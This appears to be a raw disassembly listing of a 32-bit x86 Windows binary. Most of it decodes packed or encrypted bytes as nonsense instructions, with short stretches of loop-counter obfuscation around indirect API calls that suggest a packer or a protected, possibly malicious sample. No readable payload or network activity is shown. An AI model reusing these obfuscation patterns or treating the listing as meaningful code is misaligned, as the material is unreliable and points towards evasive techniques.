  40476e:	xchg   esi,eax
  40476f:	scas   al,BYTE PTR es:[edi]
  404770:	sbb    eax,0xf6e7fab8
  404775:	cdq    
  404776:	cmp    eax,0xa838cf9b
  40477b:	mul    BYTE PTR [ecx-0x6276c4af]
  404781:	loope  0x4047e7
  404783:	mov    ecx,0x1a422e00
  404788:	xchg   edx,eax
  404789:	push   edi
  40478a:	imul   edx,DWORD PTR [ebx+0x4faa393d],0x8f099b3b
  404794:	gs dec esp
  404796:	sbb    ebx,edx
  404798:	push   eax
  404799:	adc    ebx,0xffffff88
  40479c:	cmp    ch,dl
  40479e:	out    dx,eax
  40479f:	adc    BYTE PTR [ecx+0x45261370],cl
  4047a5:	pop    eax
  4047a6:	pop    ebx
  4047a7:	mov    dl,0x37
  4047a9:	icebp  
  4047aa:	push   esp
  4047ab:	das    
  4047ac:	add    al,0xf9
  4047ae:	(bad)  
  4047af:	inc    eax
  4047b0:	mov    DWORD PTR [eax],esi
  4047b2:	jl     0x404795
  4047b4:	adc    esi,eax
  4047b6:	push   0x1e
  4047b8:	jle    0x4047b3
  4047ba:	outs   dx,DWORD PTR ds:[esi]
  4047bb:	mov    edi,0x68dfa09d
  4047c0:	loop   0x404747
  4047c2:	or     DWORD PTR [esi+0x335c9495],eax
  4047c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047c9:	(bad)  
  4047ca:	(bad)  
  4047cb:	outs   dx,DWORD PTR ds:[esi]
  4047cc:	cmp    ch,ah
  4047ce:	and    ecx,DWORD PTR [ecx-0x7c904a24]
  4047d4:	loop   0x4047a6
  4047d6:	lods   al,BYTE PTR ds:[esi]
  4047d7:	ds jnp 0x40484b
  4047da:	fld    DWORD PTR [ecx]
  4047dc:	outs   dx,BYTE PTR ds:[esi]
  4047dd:	push   edi
  4047de:	and    al,0xe2
  4047e0:	rcl    BYTE PTR [edx+0x30],1
  4047e3:	jne    0x40481a
  4047e5:	inc    edx
  4047e6:	or     al,0xfa
  4047e8:	ins    DWORD PTR es:[edi],dx
  4047e9:	mov    bh,BYTE PTR [ecx+0x49022c57]
  4047ef:	stos   BYTE PTR es:[edi],al
  4047f0:	loope  0x4047e8
  4047f2:	inc    eax
  4047f3:	sub    eax,0xc5108f07
  4047f8:	mov    al,0xc7
  4047fa:	sbb    al,0x77
  4047fc:	(bad)  
  4047fe:	jo     0x4047c1
  404800:	enter  0xc9e8,0x44
  404804:	dec    ecx
  404805:	or     al,0xd4
  404807:	inc    esp
  404808:	push   ds
  404809:	cwde   
  40480a:	outs   dx,DWORD PTR ds:[esi]
  40480b:	(bad)  
  40480c:	ret    0x5d6a
  40480f:	and    eax,0xf0b95165
  404814:	addr16 into 
  404816:	lahf   
  404817:	in     al,dx
  404818:	add    eax,0x276f2e2d
  40481d:	adc    eax,0x9b94fe9a
  404822:	adc    al,0xc2
  404824:	mov    edi,0x61d350d9
  404829:	jmp    0x12aeba8a
  40482e:	nop
  40482f:	les    esp,FWORD PTR [ecx+edi*2-0x44]
  404833:	pop    esp
  404834:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404835:	and    bl,BYTE PTR [ebp-0x403e355d]
  40483b:	or     BYTE PTR [edx],dh
  40483d:	loop   0x4048ae
  40483f:	sbb    eax,0xc711348
  404844:	std    
  404845:	leave  
  404846:	std    
  404847:	call   0xba6a158d
  40484c:	adc    DWORD PTR [esi+0x1f508d7],edx
  404852:	ss pushf 
  404854:	lock int3 
  404856:	stc    
  404857:	aad    0x4
  404859:	adc    ebx,ecx
  40485b:	sub    ch,BYTE PTR ds:0x7d536ff8
  404861:	aad    0x38
  404863:	call   0xd0b5:0xa43c2605
  40486a:	fnstcw WORD PTR [edx-0x33]
  40486d:	and    bh,BYTE PTR [ebx]
  40486f:	addr16 push 0x471f97cf
  404875:	scas   al,BYTE PTR es:[edi]
  404876:	rcl    bh,1
  404878:	mov    cl,0xb9
  40487a:	jnp    0x404821
  40487c:	sub    ebx,edx
  40487e:	sub    DWORD PTR [ebx],esp
  404880:	out    dx,eax
  404881:	(bad)  
  404883:	neg    DWORD PTR [ebx+0x19a76a57]
  404889:	jg     0x404826
  40488b:	mov    al,ds:0xaea7aea5
  404890:	shr    DWORD PTR [ebx+0x32],0x42
  404894:	pop    es
  404895:	inc    edi
  404896:	aam    0x65
  404898:	pop    esi
  404899:	jo     0x4048a1
  40489b:	dec    ecx
  40489c:	mov    ebp,0x1412966d
  4048a1:	push   edx
  4048a2:	push   ebp
  4048a3:	sub    eax,0xca8a6f93
  4048a8:	push   edx
  4048a9:	setle  ah
  4048ac:	dec    edi
  4048ad:	xchg   ecx,eax
  4048ae:	sub    DWORD PTR [ebx-0x7a2b34b9],0xc2a5ca7b
  4048b8:	add    BYTE PTR [esi+eiz*1-0x32],cl
  4048bc:	jne    0x40489c
  4048be:	sbb    eax,DWORD PTR [eax]
  4048c0:	mov    ebx,0x225a3977
  4048c5:	call   0x4c8b7f4e
  4048ca:	enter  0x155f,0x63
  4048ce:	adc    BYTE PTR [ebp+ecx*2-0x34],bh
  4048d2:	mov    eax,0xc406cf91
  4048d7:	retf   
  4048d8:	or     dh,BYTE PTR [ecx+0x127deeff]
  4048de:	add    BYTE PTR [edi+ebp*1],0x9a
  4048e2:	retf   
  4048e3:	aas    
  4048e4:	xlat   BYTE PTR ds:[ebx]
  4048e5:	sbb    dh,cl
  4048e7:	fist   WORD PTR [ebx+0x2154747e]
  4048ed:	leave  
  4048ee:	xchg   ebp,eax
  4048ef:	(bad)  
  4048f0:	mov    ah,0xb
  4048f2:	add    edi,DWORD PTR [edx+0x2c0298b6]
  4048f8:	xor    al,0x8d
  4048fa:	retf   
  4048fb:	mov    al,ds:0xdfea8f35
  404900:	cmp    eax,0xa699482f
  404905:	pop    esp
  404906:	call   0xe3ad:0x23e3bcea
  40490d:	sub    DWORD PTR [edx],eax
  40490f:	jle    0x4048f1
  404911:	outs   dx,DWORD PTR ds:[esi]
  404912:	popa   
  404913:	pop    ebp
  404914:	pop    ss
  404915:	and    BYTE PTR [edi+0x42],cl
  404918:	fwait
  404919:	je     0x404967
  40491b:	mov    ah,0x21
  40491d:	xor    cl,BYTE PTR [edx+eiz*4]
  404920:	stos   DWORD PTR es:[edi],eax
  404921:	pusha  
  404922:	add    al,0x76
  404924:	xor    edx,DWORD PTR [edx]
  404926:	nop
  404927:	jle    0x404946
  404929:	jb     0x404906
  40492b:	mov    DWORD PTR ds:0x650ea2e8,esp
  404931:	cmp    eax,0xb064b034
  404936:	pushf  
  404937:	dec    ebp
  404938:	neg    DWORD PTR [eax]
  40493a:	ja     0x404996
  40493c:	cmp    eax,0x73afbe43
  404941:	scas   eax,DWORD PTR es:[edi]
  404942:	or     al,0xbf
  404944:	xchg   edx,eax
  404945:	neg    edi
  404947:	dec    esi
  404948:	xor    DWORD PTR [ebp-0x344fde6c],esi
  40494e:	inc    ebx
  40494f:	lods   al,BYTE PTR ds:[esi]
  404950:	shl    DWORD PTR [edx],0x13
  404953:	mov    ds:0xbd8800f1,eax
  404958:	add    al,0x87
  40495a:	mov    edi,0x1f3b2bb7
  40495f:	test   DWORD PTR [edx],edi
  404961:	pop    edx
  404962:	mov    ecx,0xd8f3b348
  404967:	ror    DWORD PTR [ebx],cl
  404969:	or     BYTE PTR [esi+0x10],0xd9
  40496d:	xor    DWORD PTR [ebp-0x5a1d76d9],eax
  404973:	dec    esi
  404974:	int3   
  404975:	sub    cl,bl
  404977:	xor    al,0x52
  404979:	out    dx,eax
  40497a:	leave  
  40497b:	stc    
  40497c:	dec    esi
  40497d:	xchg   edi,eax
  40497e:	inc    esi
  40497f:	dec    eax
  404980:	add    ah,al
  404982:	add    DWORD PTR [ebx-0x67],ebx
  404985:	sub    al,0xf4
  404987:	outs   dx,BYTE PTR ds:[esi]
  404988:	sub    DWORD PTR [edi-0x55],esi
  40498b:	shl    DWORD PTR [esi],cl
  40498d:	out    0x41,al
  40498f:	hlt    
  404990:	imul   ebp,DWORD PTR [edi],0x2c
  404993:	or     esp,DWORD PTR [esi]
  404995:	adc    eax,0xb9b9ead1
  40499a:	test   bl,bh
  40499c:	dec    ecx
  40499d:	(bad)  [esi-0x35]
  4049a0:	cmp    ecx,DWORD PTR [ebx-0x3eb13cc4]
  4049a6:	sbb    DWORD PTR ds:0x5867f92e,edi
  4049ac:	shr    ebx,cl
  4049ae:	pslld  mm5,QWORD PTR [esi-0x4a]
  4049b2:	push   edx
  4049b3:	and    eax,0xf8bf3af9
  4049b8:	adc    cl,BYTE PTR [ebp+0x6f]
  4049bb:	mov    dl,BYTE PTR [esi]
  4049bd:	lahf   
  4049be:	adc    BYTE PTR [esi+0x62],bl
  4049c1:	mov    ds:0xa3257290,eax
  4049c6:	push   edi
  4049c7:	scas   al,BYTE PTR es:[edi]
  4049c8:	or     edx,DWORD PTR [edi+0x3fdaf251]
  4049ce:	outs   dx,BYTE PTR ds:[esi]
  4049cf:	call   ecx
  4049d1:	dec    edi
  4049d2:	jns    0x404a36
  4049d4:	jecxz  0x4049c2
  4049d6:	mul    DWORD PTR [ebx-0x756e0a30]
  4049dc:	jae    0x404a4d
  4049de:	push   edx
  4049df:	int    0x38
  4049e1:	mov    ecx,0x3ce01631
  4049e6:	ret    
  4049e7:	push   esi
  4049e8:	push   0x2c
  4049ea:	cli    
  4049eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049ec:	out    dx,eax
  4049ed:	xor    al,BYTE PTR [eax-0x3e]
  4049f0:	dec    ebp
  4049f1:	adc    ah,BYTE PTR [edi+0x11]
  4049f4:	or     DWORD PTR [edx-0x7376b445],eax
  4049fa:	int    0xee
  4049fc:	sub    dh,BYTE PTR [edi+0x42c57703]
  404a02:	outs   dx,DWORD PTR ds:[esi]
  404a03:	(bad)  
  404a04:	push   ss
  404a05:	jg     0x4049a7
  404a07:	mov    BYTE PTR [eax-0x1903c6b1],0x6f
  404a0e:	je     0x40499f
  404a10:	cmc    
  404a11:	sar    BYTE PTR [edi],0x3b
  404a14:	ret    0x99c6
  404a17:	xor    dh,BYTE PTR [esi-0x34cb9128]
  404a1d:	das    
  404a1e:	cmp    cl,bh
  404a20:	jp     0x404a48
  404a22:	jle    0x404a64
  404a24:	psrlw  mm6,mm2
  404a27:	das    
  404a28:	mov    al,BYTE PTR [ecx]
  404a2a:	ret    0x129f
  404a2d:	and    dh,BYTE PTR [ecx+0x7f]
  404a30:	or     BYTE PTR [edx+0x78],ch
  404a33:	fnstsw ax
  404a35:	jmp    0x4049de
  404a37:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  404a39:	and    eax,0x54cd87b6
  404a3e:	loopne 0x404a39
  404a40:	xchg   esi,eax
  404a41:	retf   
  404a42:	or     eax,0x291aa0f6
  404a47:	data16 mov dl,0x32
  404a4a:	dec    edx
  404a4b:	jecxz  0x404a17
  404a4d:	and    al,0xbd
  404a4f:	push   ss
  404a50:	push   esi
  404a51:	jecxz  0x404a78
  404a53:	sbb    DWORD PTR [ecx-0x10],0xffffffe8
  404a57:	(bad)  
  404a58:	xlat   BYTE PTR ds:[ebx]
  404a59:	and    eax,0xde1fd3f0
  404a5e:	lock xor al,bl
  404a61:	add    al,0xff
  404a63:	mov    al,dh
  404a65:	inc    edx
  404a66:	int3   
  404a67:	fisub  DWORD PTR [esi]
  404a69:	xchg   ecx,eax
  404a6a:	mov    dl,BYTE PTR [edx]
  404a6c:	xchg   esi,eax
  404a6d:	push   ss
  404a6e:	into   
  404a6f:	pop    edi
  404a70:	pop    esi
  404a71:	pop    ebx
  404a72:	leave  
  404a73:	ret    
  404a74:	push   ebp
  404a75:	mov    ebp,esp
  404a77:	sub    esp,0x2c
  404a7a:	leave  
  404a7b:	ret    0x10
  404a7e:	push   ebp
  404a7f:	mov    ebp,esp
  404a81:	sub    esp,0x44
  404a84:	adc    DWORD PTR ds:0x43383f,edi
  404a8a:	push   edi
  404a8b:	mov    eax,DWORD PTR [ebp+0xc]
  404a8e:	mov    edx,DWORD PTR ds:0x4337b7
  404a94:	and    DWORD PTR ds:0x433803,edx
  404a9a:	mov    DWORD PTR [ebp-0x10],eax
  404a9d:	adc    DWORD PTR ds:0x43372b,0x2679
  404aa7:	mov    eax,DWORD PTR [ebp+0x8]
  404aaa:	xor    ecx,DWORD PTR ds:0x43376b
  404ab0:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  404ab7:	mov    DWORD PTR ds:0x43382b,0x7030
  404ac1:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  404ac8:	and    DWORD PTR ds:0x4337c3,0x0
  404ad2:	mov    edi,DWORD PTR ds:0x4337c3
  404ad8:	inc    edi
  404ad9:	mov    DWORD PTR ds:0x4337c3,edi
  404adf:	cmp    DWORD PTR ds:0x4337c3,0x6
  404ae6:	jne    0x404af5
  404aec:	push   DWORD PTR [ebp-0x18]
  404aef:	call   DWORD PTR ds:0x412358
  404af5:	cmp    DWORD PTR ds:0x4337c3,0x5
  404afc:	jne    0x404b0f
  404b02:	mov    edi,DWORD PTR ds:0x4337c3
  404b08:	inc    edi
  404b09:	mov    DWORD PTR ds:0x4337c3,edi
  404b0f:	cmp    DWORD PTR ds:0x4337c3,0x14
  404b16:	jb     0x404ad2
  404b1c:	jmp    0x404e76
  404b21:	push   ecx
  404b22:	mov    esi,0xf1913591
  404b27:	jno    0x404b83
  404b29:	ins    DWORD PTR es:[edi],dx
  404b2a:	inc    ebp
  404b2b:	fild   WORD PTR [ecx-0x4f502b27]
  404b31:	xor    ebp,DWORD PTR ds:0x7d337e7e
  404b37:	jle    0x404bb7
  404b39:	or     dh,BYTE PTR [edi-0x49]
  404b3c:	(bad)  
  404b3d:	sub    ebx,esi
  404b3f:	push   ds
  404b40:	scas   eax,DWORD PTR es:[edi]
  404b41:	iret   
  404b42:	mov    esi,DWORD PTR [edi+eax*1-0xce6911a]
  404b49:	stc    
  404b4a:	sbb    ebp,0x5d85d551
  404b50:	fcom   QWORD PTR [ecx+0x1e]
  404b53:	pop    edx
  404b54:	fadd   DWORD PTR [ebx+0x249cc525]
  404b5a:	fisub  WORD PTR [esi-0x6a]
  404b5d:	or     al,0x2f
  404b5f:	cli    
  404b60:	or     eax,DWORD PTR [eax]
  404b62:	mov    ds:0x8d1ac95e,eax
  404b67:	sub    ebx,esp
  404b69:	hlt    
  404b6a:	sar    BYTE PTR ds:0xafe0faf5,0x87
  404b71:	pop    esp
  404b72:	pop    ds
  404b73:	mov    ecx,0x4b407469
  404b78:	mov    BYTE PTR [edi-0x5d],cl
  404b7b:	xchg   ebp,eax
  404b7c:	xchg   edx,eax
  404b7d:	outs   dx,BYTE PTR ds:[esi]
  404b7e:	bound  eax,QWORD PTR [ebx-0x409938b1]
  404b84:	cli    
  404b85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b86:	xchg   dh,al
  404b88:	and    eax,0xfe6c8947
  404b8d:	mov    bh,0x64
  404b8f:	daa    
  404b90:	dec    ebx
  404b91:	or     al,0x7e
  404b93:	test   DWORD PTR [edx-0x38],esp
  404b96:	out    0x5a,al
  404b98:	xchg   edx,ebx
  404b9a:	lahf   
  404b9b:	es adc eax,0x8344e01a
  404ba1:	(bad)  
  404ba2:	leave  
  404ba3:	cmc    
  404ba4:	das    
  404ba5:	(bad)  
  404ba6:	pusha  
  404ba7:	loop   0x404b7f
  404ba9:	test   eax,0xd24fb0f2
  404bae:	jne    0x404b62
  404bb0:	or     DWORD PTR [esi-0x75],esi
  404bb3:	add    al,0x8a
  404bb5:	adc    ecx,DWORD PTR [ebp-0x4]
  404bb8:	(bad)  
  404bba:	test   BYTE PTR [eax-0x20],cl
  404bbd:	fs cld 
  404bbf:	mov    ds,WORD PTR [edx]
  404bc1:	push   esi
  404bc2:	mov    ds:0xacd2ceae,al
  404bc7:	aaa    
  404bc8:	mov    dl,0xfa
  404bcb:	mov    ds:0xcc77f860,al
  404bd0:	mov    edi,0x5506119d
  404bd5:	pushf  
  404bd6:	dec    BYTE PTR ds:[edx-0x78]
  404bda:	mov    BYTE PTR [ebx-0x3dacb204],ch
  404be0:	pusha  
  404be1:	push   0xa2f71382
  404be6:	push   ds
  404be7:	loopne 0x404bd1
  404be9:	scas   eax,DWORD PTR es:[edi]
  404bea:	jg     0x404bb4
  404bec:	and    BYTE PTR [edx+esi*2+0x38fb827],0xd7
  404bf4:	inc    esp
  404bf5:	inc    edi
  404bf6:	in     al,0xa3
  404bf8:	inc    edi
  404bf9:	jmp    DWORD PTR ss:[ebx-0xebdc67d]
  404c00:	les    eax,FWORD PTR [eax]
  404c02:	sub    BYTE PTR [edi],cl
  404c04:	jne    0x404b99
  404c06:	pop    es
  404c07:	retf   
  404c08:	mov    ah,0x47
  404c0a:	mov    dh,0xef
  404c0c:	push   edi
  404c0d:	scas   eax,DWORD PTR es:[edi]
  404c0e:	out    dx,eax
  404c0f:	daa    
  404c10:	mov    al,BYTE PTR [ebx-0x28c3cec3]
  404c16:	cmc    
  404c17:	out    0xce,eax
  404c19:	mov    eax,0xe63244a5
  404c1e:	xor    al,0x28
  404c20:	add    DWORD PTR [edi+0x6f55ed80],0xffffffe8
  404c27:	out    dx,eax
  404c28:	(bad)  
  404c29:	fmul   QWORD PTR [esi-0x4a]
  404c2c:	call   0x68b8a297
  404c31:	fidiv  WORD PTR [edx]
  404c33:	rol    BYTE PTR ds:0xa28177b8,cl
  404c39:	call   0xeaa:0xb48e206a
  404c40:	mov    ds:0x60f362f2,eax
  404c45:	mov    ?,WORD PTR ds:0x29d69de7
  404c4b:	out    dx,eax
  404c4c:	iret   
  404c4d:	lods   al,BYTE PTR ds:[esi]
  404c4e:	push   esp
  404c4f:	add    eax,0xc7f9808f
  404c54:	std    
  404c55:	inc    edx
  404c56:	repnz push esp
  404c58:	sbb    ch,dl
  404c5a:	cmp    BYTE PTR [eax],al
  404c5c:	mov    eax,0xf52770b8
  404c61:	adc    DWORD PTR [eax],ecx
  404c63:	pushf  
  404c64:	and    eax,0x71b573d3
  404c69:	and    ecx,DWORD PTR [ebx-0x38f0fc7]
  404c6f:	jb     0x404c35
  404c71:	xchg   esp,eax
  404c72:	adc    al,0xa2
  404c74:	jle    0x404c0f
  404c76:	sbb    dl,dh
  404c78:	rcl    BYTE PTR ds:0xff2905b0,1
  404c7e:	xchg   edi,edi
  404c80:	pop    edx
  404c81:	inc    edx
  404c82:	inc    ebp
  404c83:	inc    ebx
  404c84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c85:	test   eax,0xd68e7e6f
  404c8a:	in     al,dx
  404c8b:	arpl   WORD PTR ds:0x890b11e2,di
  404c91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c92:	inc    ecx
  404c93:	stos   DWORD PTR es:[edi],eax
  404c94:	pop    edx
  404c95:	bound  edi,QWORD PTR [esi+0x6a]
  404c98:	cmp    edi,ebp
  404c9a:	push   ds
  404c9b:	popf   
  404c9c:	xor    al,0xe5
  404c9e:	mov    eax,ds:0x72bf4310
  404ca3:	out    0xaa,al
  404ca5:	or     eax,0x59561bc1
  404caa:	test   DWORD PTR [ecx+0x1b],eax
  404cad:	popf   
  404cae:	pop    edx
  404caf:	(bad)  
  404cb0:	xchg   edi,eax
  404cb1:	xchg   BYTE PTR [edx+0x58],al
  404cb4:	jbe    0x404ce9
  404cb6:	(bad)  
  404cb7:	lock mov BYTE PTR fs:[eax],dh
  404cbb:	xchg   edx,eax
  404cbc:	and    DWORD PTR [edi+0x40230bd8],eax
  404cc2:	and    dl,dh
  404cc4:	mov    bl,0x17
  404cc6:	retf   0xc834
  404cc9:	pop    es
  404cca:	out    dx,al
  404ccb:	mov    esi,0xf2786e2
  404cd0:	adc    DWORD PTR [ecx+0x76e99af7],eax
  404cd6:	scas   al,BYTE PTR es:[edi]
  404cd7:	out    0xa1,eax
  404cd9:	add    DWORD PTR [ecx+esi*8],eax
  404cdc:	cs jmp 0x404ce6
  404cdf:	mov    dl,0x38
  404ce1:	mov    bh,0x33
  404ce3:	and    BYTE PTR [ebx+eiz*1],cl
  404ce6:	jge    0x404cb6
  404ce8:	(bad)  
  404ce9:	and    DWORD PTR [ebx],ebp
  404ceb:	cmp    BYTE PTR [edi-0x71],0x4
  404cef:	xchg   BYTE PTR [eax+ecx*1-0x31],dh
  404cf3:	dec    esp
  404cf4:	imul   edx,DWORD PTR [edx+0x304d987f],0xf2abe857
  404cfe:	addr16 push ss
  404d00:	mov    dl,0x1f
  404d02:	repz sbb DWORD PTR [ebx+0x1e9a71e2],ecx
  404d09:	stos   DWORD PTR es:[edi],eax
  404d0a:	icebp  
  404d0b:	and    bh,BYTE PTR [edi+0x27]
  404d0e:	mov    ch,0x55
  404d10:	jge    0x404d8d
  404d12:	(bad)  
  404d13:	test   al,0x89
  404d15:	pop    ss
  404d16:	cmp    ecx,DWORD PTR [edx*8+0x507c417b]
  404d1d:	sahf   
  404d1e:	retf   
  404d1f:	xor    eax,0x7739a23a
  404d24:	inc    edx
  404d25:	nop
  404d26:	adc    eax,0x6cd2f769
  404d2b:	out    0x92,al
  404d2d:	adc    esp,ebp
  404d2f:	xor    DWORD PTR [edi-0x4f5c31fe],ecx
  404d35:	les    edi,FWORD PTR [edx-0x42]
  404d38:	mov    ebp,0x56fb5ac1
  404d3d:	add    ah,BYTE PTR [ebx-0x3fa9b740]
  404d43:	xor    DWORD PTR [edx+eiz*4-0x163cb38c],esi
  404d4a:	xor    ebx,DWORD PTR [edx]
  404d4c:	jae    0x404d9f
  404d4e:	dec    ebx
  404d4f:	inc    ebp
  404d50:	clc    
  404d51:	mov    al,ds:0x2f744f2f
  404d56:	ret    
  404d57:	pop    ds
  404d58:	and    DWORD PTR [edx+0x1b],0x80e33f14
  404d5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d60:	rcl    dl,cl
  404d62:	pop    edx
  404d63:	inc    ebp
  404d64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d65:	outs   dx,BYTE PTR ds:[esi]
  404d66:	push   edi
  404d67:	rcl    BYTE PTR [edi-0x2846c0dd],0xd2
  404d6e:	jb     0x404dd9
  404d70:	mov    cl,0xa2
  404d72:	fist   DWORD PTR [eax+0x74]
  404d75:	hlt    
  404d76:	cwde   
  404d77:	sbb    BYTE PTR [eax+0x5e74875f],dh
  404d7d:	jmp    0x404d05
  404d7f:	xchg   DWORD PTR [esi],eax
  404d81:	jmp    0xba2e0c29
  404d86:	call   0x603:0x573e45fb
  404d8d:	lds    ebx,FWORD PTR [eax]
  404d8f:	(bad)  
  404d90:	and    edi,edi
  404d92:	jmp    0x5337:0xe6fb0ff8
  404d99:	dec    ebp
  404d9a:	push   esi
  404d9b:	mov    ds:0x2227b53f,al
  404da0:	retf   0x8d0c
  404da3:	mov    edx,0xc98e7035
  404da8:	sub    eax,0x83927a34
  404dad:	mov    ch,0x1c
  404daf:	sbb    cl,dh
  404db1:	xlat   BYTE PTR ds:[ebx]
  404db2:	xchg   cl,dl
  404db4:	cmp    ch,BYTE PTR [edi]
  404db6:	dec    ebp
  404db7:	nop
  404db8:	in     eax,dx
  404db9:	ficom  WORD PTR [edx-0xf7808a3]
  404dbf:	jno    0x404e38
  404dc1:	inc    ecx
  404dc2:	shl    BYTE PTR ss:[eax+0x41],cl
  404dc6:	pop    esi
  404dc7:	cmp    eax,0x46d460ea
  404dcc:	xor    DWORD PTR [eax+edx*4-0x59f0ab54],ecx
  404dd3:	inc    ecx
  404dd4:	xchg   esp,eax
  404dd5:	or     ecx,eax
  404dd7:	sub    dl,BYTE PTR [ecx+ecx*1+0x26]
  404ddb:	ins    BYTE PTR es:[edi],dx
  404ddc:	sahf   
  404ddd:	inc    eax
  404dde:	out    dx,al
  404ddf:	stos   DWORD PTR es:[edi],eax
  404de0:	and    BYTE PTR [ebx+esi*4+0x68],dl
  404de4:	cmp    al,BYTE PTR [edx+0xe]
  404de7:	xchg   edx,eax
  404de8:	push   ebx
  404de9:	clc    
  404dea:	in     al,dx
  404deb:	sub    cl,BYTE PTR ds:0xced55d57
  404df1:	ror    DWORD PTR [edi-0x57fc9260],cl
  404df7:	dec    edi
  404df8:	rcr    DWORD PTR [edi+ecx*4],0xb8
  404dfc:	or     eax,0x4b54f8c
  404e01:	jne    0x404e17
  404e03:	jnp    0x404df0
  404e05:	loop   0x404daa
  404e07:	add    ch,cl
  404e09:	sahf   
  404e0a:	sub    BYTE PTR [eax],dh
  404e0c:	jge    0x404de1
  404e0e:	pop    es
  404e0f:	imul   DWORD PTR [eax+eax*8-0x6f76d62d]
  404e16:	call   0x48b5350e
  404e1b:	stos   BYTE PTR es:[edi],al
  404e1c:	or     dl,dh
  404e1e:	adc    DWORD PTR [esi],0xa6f21f08
  404e24:	popa   
  404e25:	les    edx,FWORD PTR [esi-0x3758d3b7]
  404e2b:	je     0x404e22
  404e2d:	mov    ebx,0x8c554a65
  404e32:	pop    ss
  404e33:	jbe    0x404e35
  404e35:	dec    edx
  404e36:	mov    gs,esi
  404e38:	ss mov esp,0x76757731
  404e3e:	mov    eax,ds:0x86c59edd
  404e43:	sbb    BYTE PTR [esi+0x1890f54e],bh
  404e49:	push   cs
  404e4a:	ret    
  404e4b:	int3   
  404e4c:	xor    ch,BYTE PTR [esi]
  404e4e:	dec    esp
  404e4f:	xor    al,0x63
  404e51:	scas   al,BYTE PTR es:[edi]
  404e52:	ret    
  404e53:	in     eax,0x86
  404e55:	xor    cl,BYTE PTR [edi]
  404e57:	out    dx,al
  404e58:	(bad)  
  404e59:	imul   eax,DWORD PTR [edx+esi*1+0x7ff1cac0],0x14
  404e61:	xchg   ebp,eax
  404e62:	ss stc 
  404e64:	ins    BYTE PTR es:[edi],dx
  404e65:	add    bl,ch
  404e67:	pop    edx
  404e68:	push   es
  404e69:	test   al,0xa2
  404e6b:	mov    dh,0x21
  404e6d:	mov    bl,0x2f
  404e6f:	mov    bl,BYTE PTR [edi]
  404e71:	fs xchg ecx,eax
  404e73:	pop    ecx
  404e74:	cld    
  404e75:	stos   BYTE PTR es:[edi],al
  404e76:	mov    edx,DWORD PTR [ebp+0x8]
  404e79:	adc    ecx,0x7359
  404e7f:	mov    DWORD PTR [ebp-0x40],eax
  404e82:	mov    eax,0x7510854
  404e87:	xor    edx,eax
  404e89:	adc    DWORD PTR ds:0x43371b,0x3221
  404e93:	mov    ecx,0x32729b
  404e98:	mov    edi,DWORD PTR ds:0x4337e7
  404e9e:	adc    DWORD PTR ds:0x43377f,edi
  404ea4:	add    edx,ecx
  404ea6:	neg    edi
  404ea8:	mov    DWORD PTR [ebp-0x8],edx
  404eab:	mov    DWORD PTR ds:0x4337eb,0x10
  404eb5:	cmp    DWORD PTR ds:0x4337eb,0x0
  404ebc:	je     0x404f14
  404ec2:	cmp    DWORD PTR ds:0x4337eb,0x9
  404ec9:	jne    0x404ee2
  404ecf:	push   0x6f04
  404ed4:	push   0x5d47
  404ed9:	push   DWORD PTR [ebp-0x1c]
  404edc:	call   DWORD PTR ds:0x41235c
  404ee2:	cmp    DWORD PTR ds:0x4337eb,0xa
  404ee9:	jne    0x404efc
  404eef:	mov    edi,DWORD PTR ds:0x4337eb
  404ef5:	dec    edi
  404ef6:	mov    DWORD PTR ds:0x4337eb,edi
  404efc:	mov    edi,DWORD PTR ds:0x4337eb
  404f02:	dec    edi
  404f03:	mov    DWORD PTR ds:0x4337eb,edi
  404f09:	jmp    0x404eb5
  404f0e:	and    DWORD PTR ds:0x43383f,ecx
  404f14:	mov    edx,DWORD PTR [ebp+0x8]
  404f17:	sbb    edi,DWORD PTR ds:0x4337eb
  404f1d:	xor    edx,eax
  404f1f:	sbb    edi,DWORD PTR ds:0x4337bf
  404f25:	add    edx,ecx
  404f27:	and    DWORD PTR ds:0x43383b,0x0
  404f31:	xor    edi,edi
  404f33:	add    edi,DWORD PTR ds:0x43383b
  404f39:	inc    edi
  404f3a:	mov    DWORD PTR ds:0x43383b,edi
  404f40:	cmp    DWORD PTR ds:0x43383b,0xc
  404f47:	jne    0x404f58
  404f4d:	push   0x3fd8
  404f52:	call   DWORD PTR ds:0x412000
  404f58:	cmp    DWORD PTR ds:0x43383b,0xb
  404f5f:	jne    0x404f72
  404f65:	mov    edi,DWORD PTR ds:0x43383b
  404f6b:	inc    edi
  404f6c:	mov    DWORD PTR ds:0x43383b,edi
  404f72:	cmp    DWORD PTR ds:0x43383b,0x17
  404f79:	jb     0x404f31
  404f7f:	mov    DWORD PTR [ebp+0xc],edx
  404f82:	mov    DWORD PTR ds:0x433737,0x5f27
  404f8c:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  404f93:	xor    DWORD PTR ds:0x433767,edi
  404f99:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  404fa0:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  404fa7:	sbb    DWORD PTR ds:0x4337ef,edi
  404fad:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  404fb4:	adc    DWORD PTR ds:0x43370f,ecx
  404fba:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  404fc1:	movzx  edi,WORD PTR ds:0x433767
  404fc8:	and    DWORD PTR ds:0x433713,edi
  404fce:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  404fd5:	dec    edx
  404fd6:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  404fdd:	mov    edx,DWORD PTR [ebp+0x8]
  404fe0:	add    DWORD PTR ds:0x4337e7,ebx
  404fe6:	xor    edx,eax
  404fe8:	add    edi,0x469e
  404fee:	mov    edi,DWORD PTR [ebp-0x10]
  404ff1:	add    edx,ecx
  404ff3:	cmp    edi,edx
  404ff5:	mov    DWORD PTR ds:0x43382f,0x53a
  404fff:	je     0x40685f
